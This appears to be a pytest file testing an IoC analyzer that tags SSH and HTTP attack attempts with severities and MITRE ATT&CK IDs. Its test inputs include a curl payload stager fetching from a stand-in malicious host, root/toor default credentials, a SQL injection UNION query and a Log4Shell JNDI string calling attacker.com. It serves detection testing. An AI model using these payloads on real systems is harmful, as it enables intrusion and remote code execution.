import pytest
from core.ioc_analyzer import IoCAnalyzer

def test_ssh_default_credentials():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_attempt("root", "toor")
    assert "DEFAULT_CREDENTIAL_ABUSE" in tags
    assert "ROOT_LOGIN_ATTEMPT" in tags
    assert score >= 70
    assert "T1078.001" in mitre

def test_ssh_malware_stager_detection():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_command("curl -O http://malicious.site/payload.sh && chmod +x payload.sh")
    assert "MALWARE_STAGER" in tags
    assert "INGRESS_TOOL_TRANSFER" in tags
    assert severity == "CRITICAL"
    assert "T1105" in mitre

def test_ssh_system_recon():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_command("uname -a && whoami")
    assert "SYSTEM_RECONNAISSANCE" in tags
    assert "T1082" in mitre

def test_http_sqli_analysis():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/products?id=1 UNION SELECT null, username, password FROM users--",
        headers={"user-agent": "sqlmap/1.5"}
    )
    assert any("SQL" in tag for tag in tags) or score >= 50
    assert severity in ["MEDIUM", "HIGH", "CRITICAL"]

def test_http_log4shell_analysis():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/",
        headers={"user-agent": "${jndi:ldap://attacker.com/exploit}"}
    )
    assert "LOG4SHELL" in tags or severity == "CRITICAL"
    assert score >= 90
